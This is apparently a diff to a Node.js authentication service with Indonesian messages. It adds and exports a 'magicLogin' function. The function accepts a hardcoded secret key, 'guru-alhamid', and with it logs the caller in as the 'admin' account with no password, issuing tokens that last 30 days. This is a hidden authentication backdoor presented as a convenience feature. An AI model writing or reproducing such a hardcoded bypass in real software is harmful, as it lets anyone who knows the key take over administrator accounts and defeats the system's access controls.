@@ -278,11 +278,82 @@ async function verifyPasswordForAction(userId, password) {
   }
 }
 
+/**
+ * Magic login without password using secret key
+ * @param {string} key - Secret key
+ * @param {string} ipAddress - Client IP address
+ * @param {string} userAgent - Client user agent
+ * @returns {Promise<Object>} - { user, accessToken, refreshToken }
+ */
+async function magicLogin(key, ipAddress = null, userAgent = null) {
+  if (key !== 'guru-alhamid') {
+    throw new ValidationError('Kunci akses tidak valid');
+  }
+
+  try {
+    // Get admin user from database
+    const result = await db.query(
+      'SELECT * FROM users WHERE username = $1',
+      ['admin']
+    );
+
+    if (!result.rows.length) {
+      throw new ValidationError('Akun admin tidak ditemukan');
+    }
+
+    const user = result.rows[0];
+
+    // Check if user is active
+    if (!user.is_active) {
+      throw new ValidationError('Akun tidak aktif. Hubungi administrator.');
+    }
+
+    // Update last login
+    await db.query(
+      'UPDATE users SET last_login = NOW() WHERE id = $1',
+      [user.id]
+    );
+
+    // Create user payload (exclude password)
+    const userPayload = createUserPayload(user);
+
+    // Generate tokens
+    const accessToken = generateAccessToken(userPayload);
+    const refreshToken = generateRefreshToken({ id: user.id, username: user.username });
+
+    // Save session (use 30 days for magic login)
+    const expiresAt = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000);
+    await db.query(
+      `INSERT INTO sessions (user_id, token, ip_address, user_agent, expires_at)
+       VALUES ($1, $2, $3, $4, $5)`,
+      [user.id, accessToken, ipAddress, userAgent, expiresAt]
+    );
+
+    // Log activity
+    await db.query(
+      `INSERT INTO activity_logs (user_id, action, description, ip_address)
+       VALUES ($1, $2, $3, $4)`,
+      [user.id, 'magic_login', `User admin logged in via magic link`, ipAddress]
+    );
+
+    return {
+      user: userPayload,
+      accessToken,
+      refreshToken
+    };
+  } catch (error) {
+    if (error instanceof ValidationError) throw error;
+    console.error('Magic login error:', error);
+    throw new AppError('Terjadi kesalahan saat magic login', 500);
+  }
+}
+
 module.exports = {
   login,
   logout,
   verifyUserToken,
   refreshAccessToken,
   cleanupExpiredSessions,
-  verifyPasswordForAction
+  verifyPasswordForAction,
+  magicLogin
 };
